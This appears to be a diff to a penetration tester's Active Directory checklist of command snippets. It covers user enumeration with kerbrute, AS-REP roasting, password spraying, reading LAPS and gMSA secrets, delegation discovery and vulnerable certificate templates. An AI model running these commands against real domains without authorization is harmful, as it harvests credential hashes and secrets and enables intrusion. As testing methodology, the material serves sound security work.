@@ -15,6 +15,7 @@ sudo ntpdate <DCIP>
 - [ ] Anonymous LDAP: :Pb ldap
 - [ ] A user list from RID cycling, LDAP and kerbrute: :Pb domain-enum
 kerbrute userenum -d <Domain> --dc <DCIP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute.txt
+grep 'VALID USERNAME' kerbrute.txt | awk '{print $NF}' | cut -d '@' -f1 >> users.txt
 - [ ] AS-REP roasting with that list: :Pb asrep
 impacket-GetNPUsers '<Domain>/' -usersfile users.txt -no-pass -dc-ip <DCIP> -format hashcat -outputfile asrep.txt
 - [ ] The lockout policy read, then each username tried as its own password: :Pb spraying
@@ -37,7 +38,7 @@ nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M laps
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --gmsa
 nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' -M maq
 - [ ] Unconstrained, constrained and resource-based delegation
-nxc ldap <DCIP> -d <Domain> -u '<Username>' -p '<Password>' --trusted-for-delegation
+impacket-findDelegation '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
 - [ ] Certificate services and their templates
 certipy find -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -vulnerable -stdout
 - [ ] A GPO I can edit, from BloodHound
